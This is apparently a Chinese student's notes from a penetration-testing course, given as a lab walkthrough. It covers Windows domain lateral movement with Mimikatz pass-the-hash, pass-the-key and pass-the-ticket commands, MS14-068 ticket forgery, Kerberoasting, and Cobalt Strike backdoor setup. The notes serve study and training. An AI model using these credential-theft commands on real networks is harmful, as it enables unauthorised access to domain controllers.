![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUJfsdBjZyFSM2oCtpX8yvjMJ53PLfkKGsnNEnX8AA4utnaL6YictGHPQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdULZ76MuPT7UNoF8XLib6viblLWG9g2qNDqtSkU40x1yIJeMicWr16TzMiaA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU7gOkU2SXu9mzDexSNVtHCl9Dxax9zHz0ibxmJUtxibsKDb2EdbyEw9kg%2F640%3Fwx_fmt%3Dpng)

案例4-域横向移动以上服务bash批量利用-python编译exe

* * *

## day68.域横向 PTH&PTK&PTT 哈希票据传递

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUmCFSLfFCrUr5ZJIP8E9KCuZ1icbf8P2ialOt9YvEPDVt3W2I98LyN6jg%2F640%3Fwx_fmt%3Dpng)

Kerberos协议具体工作方法,在域种,简要介绍一下:-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUQiaeyYcylFJL1HpCykTb7SiaGRnJsVxaqmPeT9acQDnb0iclJZKkU83CA%2F640%3Fwx_fmt%3Dpng)

    PTH(pass the hash) #利用lm或ntlm的值进行的渗透测试

_演示案例:_

### 域横向移动PTH传递-Mimikatz

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUpm7yPcgpXico6sceIsibG7Dc2EwNMeSMBpMhTT4uMictfVmiayrrf1icZyw%2F640%3Fwx_fmt%3Dpng)

严谨一点,LM和NTML最好都收集

下面这个命令是获取aes256加密的

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUCvy3ia6Aw4Sia0m1jwfKYUsD9rOUN89kukMBWto46dP5ue5xrIxJDqQQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUpj4BAssl3ob57Hp7yCMEgJnRwiaDvWia3MtGDsVuZwPsJBBenwCNrXMA%2F640%3Fwx_fmt%3Dpng)

PTH ntlm床底

未打补丁得到工作组及域连接:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUtVdrKTDqWBax5DWnjdbia1xxRHVWzRFW442hNhx08neS15RSSI5RRIw%2F640%3Fwx_fmt%3Dpng)

攻击当前域控主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUmXmnBPh5YUO0a8JGpvoNzibJH5DYDFtInySUo7HDDCaCHHfd3uibpn2A%2F640%3Fwx_fmt%3Dpng)

直接连接域控主机是无法连接的

使用mimikatz进行攻击

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUZKibPLpsJ5apicR0Bwc8ITfK5x4fvjiaKhp94VIgEwd6QVhdcaricKcgnQ%2F640%3Fwx_fmt%3Dpng)

攻击命令上并没有指定IP地址,这是一种随机攻击,IP地址是前期信息收集的,连接时,可以遍历IP地址,

看那个有回显

攻击成功反弹回来了一个cmd

在这个cmd中进行连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU310tWNddYtRshDlBEibH3spPgbyicT2SODjl69yeOPyQE7MufKFc5xjQ%2F640%3Fwx_fmt%3Dpng)

如果IP地址不识别,就换成计算机名

之后就和at schtasks一样了,复制文件,执行文件等

攻击另外一台主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUS31UopQZWJ4corwXiaQKtDZsSFSib8uCKnPotcPI64F4ibJrnPsd7ehoQ%2F640%3Fwx_fmt%3Dpng)

这里domain是一个工作组,直接连接到了主机的本地的Administered

### 案例2-域横向移动PTK传递-mimikatz

PTK aes256传递

打补丁后的工作组及域连接:

sekurlsa::ekeys #获取aes

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUPLAWianZyKjMUMCyGrRoAl1J02Dg3ppQ28jo0UrqzfroUw5pBYBayOw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdURBt8SffmyOWpjWFHTQXCXict13aWdSmHJe96zLVWIRRTUCBvRnJjzxA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUib25UXaURCnKwrsOIHxlqaruYa9RTuckrMZvjbQiaGdCML7oIKKibnk6g%2F640%3Fwx_fmt%3Dpng)

弹出一个cmd窗口,尝试连接域内主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUqBldzmrUfymXIak4araMaibiaYkKVLSMO8oTmiaeXza2TyhLp9o35DR6w%2F640%3Fwx_fmt%3Dpng)

域横向移动PTT传递-MS14068&kekeo&local

第一种利用漏洞:

能实现普通用户直接获取域控system权限

#ms14-068 powershell执行

1.查看当前sid whoami/user

2.mimikatz #kerberos::purge

//清空当前机器中所有凭证,如果有域成员凭证会影响凭证伪造

mimikatz# kerberos::list //查看当前机器凭证

mimikatz# kerberos::ptc 票据文件 //将票据注入到内存中

3.利用ms14-068生成TGT数据

ms14-058.exe 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUCpWibyvdcibvxGsbcfic0bxMGm7rEwOASMkVOQ2V77wssWia2EqsOfhE7Q%2F640%3Fwx_fmt%3Dpng)

4.票据注入内存

mimikatz.exe "kerberos::ptc TGT\_mary@god.org.ccache" exit

5.查看凭证列表 klist

6.利用 dir \\\\192.168.3.21\\C$

域内目标机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUIpnuicnEiarWopZZxR4HIQceKQ2iaGkSeH7q8H8lQ2WDsKzQLXwFx1Myw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU2c1Xtomh1zTWcSiaT1zsdQrkbXx09SrtXoLjPd22HF2ibO3gHLW9nZibg%2F640%3Fwx_fmt%3Dpng)

在域内主机mary上执行

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUDicdtob1yE4b18Bnb3b46CyB2oGxicu76LqxiaEZFy1zjcnnlibgrF216A%2F640%3Fwx_fmt%3Dpng)

生成TGT\_mary@god.org.ccache

查看mary内与那些主机有链接产生的票据

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUnDpF8ickJK0UpAsVCl01nqFiaSEHyjyPQJhA8SqTn8ic6jATgCHJNMLJw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUUCTN8MJ6L8JEbjRFwuQ3vXeCSuOVhOeKmT77OHBn62d6CCbOJmUCAA%2F640%3Fwx_fmt%3Dpng)

为了防止影响我们的操作,删除已有的票据

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUuREEp76ut825k08QDjcwOfBJm7wW4hiaEKiaWFUp2Thb0JBFWQtfMTxQ%2F640%3Fwx_fmt%3Dpng)

用mimi导入票据到内存,并且查看是否导入成功

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUyibgUBQ6H95czOB3oSJo7ouHjBlTLHWkSz3IOmibNxatVDMQTkAyZJ7w%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU1UianicAleXol8DHXzgRWmNX9ibD8IyvN32GHLn5d5OQXjQRLXOPxvtug%2F640%3Fwx_fmt%3Dpng)

连接域控主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUvVfK6wbHGJTIIjhicLgwcxYyFToSaoQyTJWjg2LSrpIiccDfvHDulUMQ%2F640%3Fwx_fmt%3Dpng)

用IP地址连接错误,用用户名

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU9k7iclgV1nmQemfuT8J6bDQibEcJ56Eu8PMRGNzI6EjKgq399yvo6GvA%2F640%3Fwx_fmt%3Dpng)

第二种利用工具kekeo

1.生成票据

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUA0ia9CtR403fuDAibqZgE5tCJxEAGsxEX4g0YnBBeYnic4YOR2Du1ZxmQ%2F640%3Fwx_fmt%3Dpng)

2.票据导入

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUQjSz1TICYSOxnptoRydLa0q3h0S8ZVAibOJcbLctJCcmRcN4gIMkfhQ%2F640%3Fwx_fmt%3Dpng)

3.查看凭证 klist

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUEuol9hib6SF9o6zpW1cWwhe612nQ98B4Vwh9kjJpOZTBdKwtwnyWDpw%2F640%3Fwx_fmt%3Dpng)

执行完命令生成票据

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUWQasPtDAM701OG7LYtr4WWWjG1huekmdgMBnicqrdftAaibgQTOk7gvQ%2F640%3Fwx_fmt%3Dpng)

将当前内存中的票据清空

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUDSZFuTlzticTQx4ib2rSicmEmVMuIniaO6xMgVmok16KsubEPBxv4QLfMg%2F640%3Fwx_fmt%3Dpng)

导入票据,查看导入成功否?

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUhrlwVt5TVB0ic61HVarfluruVPpQw9iahiamug4ufqDNy8XHWBlHzMDQg%2F640%3Fwx_fmt%3Dpng)

再进行连接

第三种利用本地票据(需要管理员权限)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUEoImvYghrVqxCkt5sHQPyaZUtnMAhsr0UesNU0bjqDoLGRmnG0KDqg%2F640%3Fwx_fmt%3Dpng)

导出票据后,会导出到你当前执行目录,收集好票据

缺陷:ptt只能保持10个小时,如果能拿到10个小时内的凭据,可以成功

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUibbA8VDvA89M4PPVh8xtaViaFzdkno6xVT6pUuTALerVQSib45lPl9B6w%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUyN5RNBXaY42ZYljxePGfdA1atLXMN9Pibc76CibbU2r2pIbJPYKCrKMA%2F640%3Fwx_fmt%3Dpng)

导入成功

### 案例4-国产Ladon内网杀器测试

信息收集-协议扫描-

我们打开Ladon的gui版本

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUfNtPAxmfvEAibBibQ69CuSudTwWX2HDRB7plhrBrLoJaRvACGoRD2DQw%2F640%3Fwx_fmt%3Dpng)

扫描时,选择的时OnlinePC(存活主机),会尝试获取存活主机

用命令行形式执行扫描存活主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUbQG8bK7ibCFooJfdXicHk7Uks6O3gF5znfXibu4LNeibpQMKJjEO7Gvneg%2F640%3Fwx_fmt%3Dpng)

* * *

本系列定期更新，麻烦点个关注吧。-

[查看原网页: mp.weixin.qq.com](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484112&idx=1&sn=036ffcfd03b4a4ee94f6f787cd7986a7&chksm=cfd87d2ff8aff439d9c2a89c2054b471a05c800e7a3d7ee605ef642b3321cab54b1423243454&mpshare=1&scene=1&srcid=0804ShxQJNTRpyL9fnnXTiBU&sharer_sharetime=1659545518776&sharer_shareid=c75c93b84e50ea6bcab5077411998942#rd)

# XD安全渗透测试课 学习笔记 | 内网渗透(三)

* * *

**_往期回顾：_**-

day58-64：[XD安全渗透测试学习笔记 | 提权阶段](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247483877&idx=2&sn=35f4bdce1d4043219dbbb67420bb5818&chksm=cfd87e1af8aff70c74e6a5541d7b120548ac3242a320083a81f4b0ae3971d60b2903e7245705&scene=21#wechat_redirect)

day65-66：[XD安全渗透测试 学习笔记 | 内网渗透(一)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484046&idx=1&sn=85b730dafd28d0e798b8c70fe8130582&chksm=cfd87d71f8aff4672c1c0d254342b6e63f026b825be225e8af7fa30f364cf49bbdb384b42b0f&scene=21#wechat_redirect)

day67-68：[XD安全渗透测试学习笔记 | 内网渗透(二)](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484112&idx=1&sn=036ffcfd03b4a4ee94f6f787cd7986a7&chksm=cfd87d2ff8aff439d9c2a89c2054b471a05c800e7a3d7ee605ef642b3321cab54b1423243454&scene=21#wechat_redirect)

* * *

## day69.域横向 CobaltStrike&SPN&RDP

案例演示

### 案例1-域横向移动RDP传递-Mimikatz、

除了上述讲到的IPC,WMI,SMB等协议的链接外,获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作。

RDP协议连接:判断对方远程桌面是否开启(3389端口)

RDP明文密码链接

    Windows:mstsc

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp5AIMdPvOoZyJ24tEFVdY8V5Xia0MYnefZvuIm94naKkDTmLFI8cF4RA%2F640%3Fwx_fmt%3Dpng)

### 案例2-域横向移动SPN服务,探针,请求,破解,重写

    https://www.cnblogs.com/backlion/p/8082623.htmo

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpxB7NFkavtet1UHVjWaLHXD2abwEKia7rQSosmkhq8SBZYDZ7bjURiaCQ%2F640%3Fwx_fmt%3Dpng)

    #探针

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpDxoXuvHoz6VkJfa3Fa5icGI3BlQxLkjLqp17VyyzSHMOs9hic1BfS2Vg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpegYqU05B5aic4wKsujyaNKPFyicC4DsKcdlYpbpdWu2VdFezxNhdQ9zA%2F640%3Fwx_fmt%3Dpng)

请求:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpt2EG6ic01MrHVCcBFavFOFuCtdib2Kv6iaUjjkTyciancrn4biaM0niaSJYA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpribDUAbM7DDzGnnzXr0eIxvJpRias85ud8ffcd2nYyCTv2eHXdtj1BibQ%2F640%3Fwx_fmt%3Dpng)

导出

mimikatz.exe "kerberos::ask /target:xxxxx"

用mimi导出刚才请求生成的票据

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpyicE5C9cIvtwQ9UEdnzLlToLrxulrFs6iatFfHyG1LaLjywIaJicicppicA%2F640%3Fwx_fmt%3Dpng)

破解

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpRJCvdnkMfOaImpIRA7NPRqxekoSxAwhW1CbImOI1fpyh7cM2vEu2fg%2F640%3Fwx_fmt%3Dpng)

破解得到一个密码Admin12345

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpvvEYkvFc0MZu5qVA4ODBcnGAmXj1WAIjTIR2wibg0yU5TrPBF4ARhgw%2F640%3Fwx_fmt%3Dpng)

域控主机的环境信息

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpY41tzYRgIwZGgw5Jp7vFg2d2EfbnelnIr3yc0ibrVGMhF2Y9g9icK2iaw%2F640%3Fwx_fmt%3Dpng)

发现的确获得sqlserver密码

重写

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp8nKX6diaDm0DibT9RSjhvxL7VBib4aA3yN8EmBUyzDxqjeFiaGKAK8quMA%2F640%3Fwx_fmt%3Dpng)

域横向移动测试流程一把梭-CS初体验

大概流程:

启动-配置-监听-执行-上线-提权-信息收集(网络,凭证,定位等)-渗透

*   1.关于启动及配置讲解
    
*   2.关于提权及插件加载
    
*   3.关于信息收集命令讲解
    
*   4.关于视图自动化功能讲解
    

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpms02XIYmZNGLyrFw2C8DEf02jibAPAFul4ajo3OApmWV9NrdZjaFeUw%2F640%3Fwx_fmt%3Dpng)

客户端连接团队服务器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpjVXVpDyibkh0rtsFto4lRmopXyJ939GLXYfb1WkvycKjhwzYHE0wtQA%2F640%3Fwx_fmt%3Dpng)

启动团队服务器,设定密码,密码再客户端连接时要验证

点击客户端连接

进入到了CS界面

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpo5n8unXu3e5TDIUpHkW7ibkdTNEOKqfzibKvqlYDibmj8ypnPrHJpI06Q%2F640%3Fwx_fmt%3Dpng)

配置监听器可以区分那个是自己的,监听器就是配置一个木⻢传输的管道

配置监听器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpfeoiaCuMFw5wo6C8uwqmjLBEvK1nibRJibkr5J3cTmbT40CnQsEscg01A%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpWQfPibJhYUbI2cg0EvCZVVn69oiaTDFtmHd46x7OO3PIxEuYexNVYZmQ%2F640%3Fwx_fmt%3Dpng)

点击ADD可以增加监听器,并且监听器支持多种协议

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpf2XhPj3jxoibtrcYWS97X2juaBlVxbhmspDSnicO4nDfNbicepAghUCFQ%2F640%3Fwx_fmt%3Dpng)

点击save保存

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpoeHkicXrj6VIhv8emYLauSKANBnv8SE0cZqdIGKEgSnGHCI98XB7J2w%2F640%3Fwx_fmt%3Dpng)

监听状态

生成后⻔,有多种后⻔,我们这里选择Windows

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpe4ZNwjR8Mry68PMNl8liczAtpEblWHlltKSmqz4MkCneFOWvSjXLWFQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpRlibKxCUY5CLbD6t41Rvn03FPD5M7l4g0LGD2mzBgPv9nO4ictvnKLfw%2F640%3Fwx_fmt%3Dpng)

绑定监听器,这个后⻔触发,就从当前的监听器走

上传到目标服务器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJps4PBdyialBHJPwIqib27bchUVWe4bia3Q2f83ALVoFSMHVqrIKHAABnwA%2F640%3Fwx_fmt%3Dpng)

后⻔执行后,cs客户端上线了目标服务器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpBgiaSCc1dKJgs6Cn2WPuiaylqX1VPf5NwiaNkl3c7mvaSIOicQEG4PAPlg%2F640%3Fwx_fmt%3Dpng)

点击视图,可以看到许多有用的信息,例如当前用户和已知的拓扑图

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp7DJVYpgmSlDn8yVhQD5j9FmjNJmib8EqW2HtfZzOVcuA5DBbxYczuXA%2F640%3Fwx_fmt%3Dpng)

接下来进行提权操作

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpIbTNfqEg15tIh20Z9Tr3HIxcDx1vXwbwsZrz2bA6lqQia4aEoSLDejQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp6RgBOwmr5sfuT5Y1gYjORMp4ianCYicZohZFvNaeR6M9TSpLILWia5nWQ%2F640%3Fwx_fmt%3Dpng)

自带的只有两种提权方式

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpNL67t1ibkaqM5aC08u6wLtIXrgOvjyJEMibq5xicI16yMQRiaZYA1D0klQ%2F640%3Fwx_fmt%3Dpng)

我们可以加载插件

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpRqmjXL68y6hedImYaCU4Ulkic0gLt1EcqoGv8CI8jVAgUvksvqf24ZQ%2F640%3Fwx_fmt%3Dpng)

上传插件

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpf5H8fP4GapKClwLZibws6vEKmCx0u87dSd2xsYqWyvGfo4yZVvuk95w%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpgZJvecDONhEB9IMr1YvfEwsDwZiagoLmW0bHgiaGribzkZh3gBJicgAYtw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJpe4uoib9cJl6uPkSh19p2hDwjhG3rUGz5kcLe9rIRSKqjYjHAyS6Lefw%2F640%3Fwx_fmt%3Dpng)

载入成功后,发现提权方式变多了

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp6fqYChVMlLpNAsyiblNV7AOG2UmxqZ1Shr3PEhlibTmmib2tSicWN8mnPA%2F640%3Fwx_fmt%3Dpng)

选中payload和监听器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibXAqM8ibM1I5CkdnJntwicJp5XHMAfof9p2xCO65eZHefiaTaZLYvqRz2HMPslZwuSiclJXWqceeian5w%2F640%3Fwx_fmt%3Dpng)

开始攻击,如果速度过慢,我们可以重新设置sleep

